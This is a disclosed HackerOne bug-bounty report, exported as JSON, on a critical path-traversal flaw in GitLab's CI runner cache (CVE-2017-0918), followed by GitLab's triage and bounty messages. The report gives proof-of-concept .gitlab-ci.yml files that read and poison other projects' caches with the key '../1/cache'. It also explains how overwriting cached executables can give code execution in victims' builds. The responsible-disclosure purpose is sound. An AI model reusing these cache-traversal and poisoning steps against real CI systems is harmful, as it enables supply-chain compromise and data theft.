{"id":301432,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDE0MzI=","url":"https://hackerone.com/reports/301432","title":"GitLab CI runner can read and poison cache of all other projects","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2017-12-30T18:58:16.329Z","submitted_at":"2017-12-30T18:58:16.329Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jobert","url":"/jobert","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":264,"url":"https://hackerone.com/gitlab","handle":"gitlab","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"GitLab","twitter_handle":"gitlab","website":"https://about.gitlab.com","about":"A single application for the entire software development lifecycle."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2017-0918"],"singular_disclosure_disabled":true,"disclosed_at":"2018-04-27T02:21:50.009Z","bug_reporter_agreed_on_going_public_at":"2018-04-25T23:40:32.633Z","team_member_agreed_on_going_public_at":"2018-04-27T02:21:49.915Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"The GitLab CI runner allows users to cache files and directories in between runs. These files are stored in a ZIP file and uploaded to a shared cache instance. In my testing, the files were uploaded to `runners-cache-4-internal.gitlab.com` and `runners-cache-3-internal.gitlab.com`, even for dedicated runners. It seems odd that dedicated runners use the same shared cache, but perhaps that was an intentional design decision. It could also be a vulnerability. I tried reaching the cache servers from a Docker instance itself, but wasn't able to (I tried from a reverse shell spawned from a Docker instance). There are multiple vulnerabilities (same root cause though) that can be chained to successfully poison the CI runner cache of another project.\n\n**Reading the cache of other projects**\nCreate a new project with a `.gitlab-ci.yml` file in it. The file should contain the following contents. By default, when a cache file is downloaded, it'll download the cache from http://runners-cache-4-internal.gitlab.com:444/runner/project/5024150/cache.\n\n**.gitlab-ci.yml**\n```\na:\n  script:\n  - ls -lashR\n  cache:\n    key: ../1/cache\n    policy: pull\n    paths:\n      - .\n```\n\nTo read the cache, the attacker needs to know two things: a project ID (auto incremental) and a cache key. By default, the project ID will be prepended to download the cache. But because it's an HTTP request and there's no additional checks on the `key` input, a path traversal vulnerability can be exploited to move up a directory and select the cache from a different project. In this case, when it downloads the cache, it'll request http://runners-cache-4-internal.gitlab.com:444/runner/gitlab/project/1/cache instead of the project ID of the build.\n\n**Build output**\n```\n\u001b[0KRunning with gitlab-runner 10.3.0 (5cf5e19a)\n  on docker-auto-scale (e11ae361)\n\u001b[0;m\u001b[0KUsing Docker executor with image ruby:2.1 ...\n\u001b[0;m\u001b[0KUsing docker image sha256:4eadb9b5cb46f487a71d05717762679404f7f6fdec1ba4fa96304de1db07dfef for predefined container...\n\u001b[0;m\u001b[0KPulling docker image ruby:2.1 ...\n\u001b[0;m\u001b[0KUsing docker image ruby:2.1 ID=sha256:223d1eaa9523fa64e78f5a92b701c9c11cbc507f0ff62246dbbacdae395ffea3 for build container...\n\u001b[0;msection_start:1514659811:prepare_script\n\u001b[0KRunning on runner-e11ae361-project-4989754-concurrent-0 via runner-e11ae361-srm-1514658950-a15d8859...\nsection_end:1514659812:prepare_script\n\u001b[0Ksection_start:1514659813:get_sources\n\u001b[0K\u001b[32;1mCloning repository...\u001b[0;m\nCloning into '/builds/jobertabma/build-test'...\n\u001b[32;1mChecking out e01918e5 as master...\u001b[0;m\n\u001b[32;1mSkipping Git submodules setup\u001b[0;m\nsection_end:1514659814:get_sources\n\u001b[0Ksection_start:1514659814:restore_cache\n\u001b[0K\u001b[32;1mChecking cache for ../13083/ruby-235-with-yarn...\u001b[0;m\nDownloading cache.zip from http://runners-cache-5-internal.gitlab.com:444/runner/project/13083/ruby-235-with-yarn\u001b[0;m \n\u001b[32;1mSuccessfully extracted cache\u001b[0;m\nsection_end:1514659844:restore_cache\n```\n\nThe cache key seems to be guessable pretty easily or even unused when no key is specified, since most will correlate with the step they're executed in. When I started looking at this, I had to specify which paths to download from the cache. This made exploitation more difficult. However, it (conveniently) allowed me to use `.` as path, extracting all files from the cache into the working directory. Running `ls -lashR` after that reveals the cache contents in the build output. Files can be read using `cat` or to store them as build artifacts through the `.gitlab-ci.yml`.\n\n**Writing the cache of other projects**\nNow that the attacker knows what files are stored in the cache, it can poison the cache with its own file contents. Create another CI YAML file with the following contents:\n\n**.gitlab-ci.yml**\n```\na:\n  script:\n  - echo 1 \u003e file-to-poison\n  cache:\n    key: ../1/cache\n    policy: push\n    paths:\n      - file-to-poison\n```\n\nThe attacker has to run a build, which will overwrite the `file-to-poison` file in the cache for project ID 1. Now, when the targeted project starts another CI run, the poisoned cache files will be downloaded and used in the CI run. For example, an attacker could poison `13083/ruby-235-with-yarn`, which would overwrite the Ruby 2.3.5 executable that is being used for GitLab CE CI runs. As you can imagine, someone could enumerate over other projects that use cached executables and overwrite them with their own code.\n\nThis has been tested against the latest version of GitLab.\n\n## Impact\n\nDepending on the files that are cached, this may allow an attacker to run arbitrary code on a victim's Docker instance running a CI run. This may expose confidential data, inject artifacts in a build pipeline to ship additional code, among other things.","vulnerability_information_html":"\u003cp\u003eThe GitLab CI runner allows users to cache files and directories in between runs. These files are stored in a ZIP file and uploaded to a shared cache instance. In my testing, the files were uploaded to \u003ccode\u003erunners-cache-4-internal.gitlab.com\u003c/code\u003e and \u003ccode\u003erunners-cache-3-internal.gitlab.com\u003c/code\u003e, even for dedicated runners. It seems odd that dedicated runners use the same shared cache, but perhaps that was an intentional design decision. It could also be a vulnerability. I tried reaching the cache servers from a Docker instance itself, but wasn\u0026#39;t able to (I tried from a reverse shell spawned from a Docker instance). There are multiple vulnerabilities (same root cause though) that can be chained to successfully poison the CI runner cache of another project.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eReading the cache of other projects\u003c/strong\u003e\u003cbr\u003e\nCreate a new project with a \u003ccode\u003e.gitlab-ci.yml\u003c/code\u003e file in it. The file should contain the following contents. By default, when a cache file is downloaded, it\u0026#39;ll download the cache from \u003ca title=\"http://runners-cache-4-internal.gitlab.com:444/runner/project/5024150/cache\" href=\"/redirect?url=http%3A%2F%2Frunners-cache-4-internal.gitlab.com%3A444%2Frunner%2Fproject%2F5024150%2Fcache\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://runners-cache-4-internal.gitlab.com:444/runner/project/5024150/cache\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003e.gitlab-ci.yml\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ea:\n  script:\n  - ls -lashR\n  cache:\n    key: ../1/cache\n    policy: pull\n    paths:\n      - .\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eTo read the cache, the attacker needs to know two things: a project ID (auto incremental) and a cache key. By default, the project ID will be prepended to download the cache. But because it\u0026#39;s an HTTP request and there\u0026#39;s no additional checks on the \u003ccode\u003ekey\u003c/code\u003e input, a path traversal vulnerability can be exploited to move up a directory and select the cache from a different project. In this case, when it downloads the cache, it\u0026#39;ll request \u003ca title=\"http://runners-cache-4-internal.gitlab.com:444/runner/gitlab/project/1/cache\" href=\"/redirect?url=http%3A%2F%2Frunners-cache-4-internal.gitlab.com%3A444%2Frunner%2Fgitlab%2Fproject%2F1%2Fcache\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://runners-cache-4-internal.gitlab.com:444/runner/gitlab/project/1/cache\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e instead of the project ID of the build.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eBuild output\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e[0KRunning with gitlab-runner 10.3.0 (5cf5e19a)\n  on docker-auto-scale (e11ae361)\n[0;m[0KUsing Docker executor with image ruby:2.1 ...\n[0;m[0KUsing docker image sha256:4eadb9b5cb46f487a71d05717762679404f7f6fdec1ba4fa96304de1db07dfef for predefined container...\n[0;m[0KPulling docker image ruby:2.1 ...\n[0;m[0KUsing docker image ruby:2.1 ID=sha256:223d1eaa9523fa64e78f5a92b701c9c11cbc507f0ff62246dbbacdae395ffea3 for build container...\n[0;msection_start:1514659811:prepare_script\n[0KRunning on runner-e11ae361-project-4989754-concurrent-0 via runner-e11ae361-srm-1514658950-a15d8859...\nsection_end:1514659812:prepare_script\n[0Ksection_start:1514659813:get_sources\n[0K[32;1mCloning repository...[0;m\nCloning into \u0026#39;/builds/jobertabma/build-test\u0026#39;...\n[32;1mChecking out e01918e5 as master...[0;m\n[32;1mSkipping Git submodules setup[0;m\nsection_end:1514659814:get_sources\n[0Ksection_start:1514659814:restore_cache\n[0K[32;1mChecking cache for ../13083/ruby-235-with-yarn...[0;m\nDownloading cache.zip from http://runners-cache-5-internal.gitlab.com:444/runner/project/13083/ruby-235-with-yarn[0;m \n[32;1mSuccessfully extracted cache[0;m\nsection_end:1514659844:restore_cache\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe cache key seems to be guessable pretty easily or even unused when no key is specified, since most will correlate with the step they\u0026#39;re executed in. When I started looking at this, I had to specify which paths to download from the cache. This made exploitation more difficult. However, it (conveniently) allowed me to use \u003ccode\u003e.\u003c/code\u003e as path, extracting all files from the cache into the working directory. Running \u003ccode\u003els -lashR\u003c/code\u003e after that reveals the cache contents in the build output. Files can be read using \u003ccode\u003ecat\u003c/code\u003e or to store them as build artifacts through the \u003ccode\u003e.gitlab-ci.yml\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003eWriting the cache of other projects\u003c/strong\u003e\u003cbr\u003e\nNow that the attacker knows what files are stored in the cache, it can poison the cache with its own file contents. Create another CI YAML file with the following contents:\u003c/p\u003e\n\n\u003cp\u003e\u003cstrong\u003e.gitlab-ci.yml\u003c/strong\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ea:\n  script:\n  - echo 1 \u0026gt; file-to-poison\n  cache:\n    key: ../1/cache\n    policy: push\n    paths:\n      - file-to-poison\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe attacker has to run a build, which will overwrite the \u003ccode\u003efile-to-poison\u003c/code\u003e file in the cache for project ID 1. Now, when the targeted project starts another CI run, the poisoned cache files will be downloaded and used in the CI run. For example, an attacker could poison \u003ccode\u003e13083/ruby-235-with-yarn\u003c/code\u003e, which would overwrite the Ruby 2.3.5 executable that is being used for GitLab CE CI runs. As you can imagine, someone could enumerate over other projects that use cached executables and overwrite them with their own code.\u003c/p\u003e\n\n\u003cp\u003eThis has been tested against the latest version of GitLab.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eDepending on the files that are cached, this may allow an attacker to run arbitrary code on a victim\u0026#39;s Docker instance running a CI run. This may expose confidential data, inject artifacts in a build pipeline to ship additional code, among other things.\u003c/p\u003e\n","bounty_amount":"2000.0","formatted_bounty":"$2,000","weakness":{"id":19,"name":"Path Traversal"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2018-05-25T23:40:32.704Z","allow_singular_disclosure_after":-81928119.51347104,"singular_disclosure_allowed":true,"vote_count":39,"voters":["jokebookservice1","alexbirsan","sp1d3rs","kapytein","jobert","bull","michiel","muon4","ramsexy","spam404","and 29 more..."],"severity":{"rating":"critical","score":9.0,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"required","scope":"changed","confidentiality":"high","integrity":"high","availability":"high"}},"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2253293,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Jobert,\n\nThank you for highlighting and detailing this vulnerability. We will immediately begin triaging and investigating this finding with our engineering and production teams. Based on current workloads and upcoming holidays, we expect that we will have a further response for you within the next 5-7 business days.\n\nRegards,\nGitLab Security Team","markdown_message":"\u003cp\u003eHi Jobert,\u003c/p\u003e\n\n\u003cp\u003eThank you for highlighting and detailing this vulnerability. We will immediately begin triaging and investigating this finding with our engineering and production teams. Based on current workloads and upcoming holidays, we expect that we will have a further response for you within the next 5-7 business days.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":false,"created_at":"2017-12-30T21:27:04.425Z","updated_at":"2017-12-30T21:27:04.425Z","actor":{"username":"kathyw","cleared":false,"url":"/kathyw","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2265263,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2018-01-05T19:45:59.294Z","updated_at":"2018-01-05T19:45:59.294Z","actor":{"username":"kathyw","cleared":false,"url":"/kathyw","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2265271,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi Jobert,\n\nCongratulations! Due to your detailed findings report #301432, we were able to work with our engineering team to report/triage the security vulnerability, and our engineering team is now working on a fix for this vulnerability.\n\nWe certainly appreciate your efforts and time, and would like to reward you accordingly, with the $2000 award for a critical security vulnerability finding. Thanks again, and we look forward to hearing from you again!\n\nRegards,\nGitLab Security Team","markdown_message":"\u003cp\u003eHi Jobert,\u003c/p\u003e\n\n\u003cp\u003eCongratulations! Due to your detailed findings report \u003ca href=\"/reports/301432\"\u003e#301432\u003c/a\u003e, we were able to work with our engineering team to report/triage the security vulnerability, and our engineering team is now working on a fix for this vulnerability.\u003c/p\u003e\n\n\u003cp\u003eWe certainly appreciate your efforts and time, and would like to reward you accordingly, with the $2000 award for a critical security vulnerability finding. Thanks again, and we look forward to hearing from you again!\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nGitLab Security Team\u003c/p\u003e\n","automated_response":false,"created_at":"2018-01-05T19:49:33.228Z","updated_at":"2018-01-05T19:49:33.228Z","actor":{"username":"kathyw","cleared":false,"url":"/kathyw","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2265275,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2018-01-05T19:50:05.878Z","updated_at":"2018-01-05T19:50:05.878Z","actor":{"url":"/gitlab","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/264/8dd359f496ba6c5b97c5126dc86924a00fd7ef26_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"GitLab"}},"bounty_amount":"2000.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"gitlab","collaborator":{"username":"jobert","url":"/jobert"},"actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2265278,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2018-01-05T19:50:44.070Z","updated_at":"2018-01-05T19:50:44.070Z","actor":{"username":"kathyw","cleared":false,"url":"/kathyw","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"jobert","url":"/jobert"},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2665584,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-04-25T23:40:32.665Z","updated_at":"2018-04-25T23:40:32.665Z","first_to_agree":true,"actor":{"username":"jobert","cleared":true,"url":"/jobert","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":true},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2670834,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-04-27T02:21:49.945Z","updated_at":"2018-04-27T02:21:49.945Z","actor":{"username":"kathyw","cleared":false,"url":"/kathyw","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2670835,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-04-27T02:21:50.039Z","updated_at":"2018-04-27T02:21:50.039Z","actor":{"username":"kathyw","cleared":false,"url":"/kathyw","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"gitlab","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}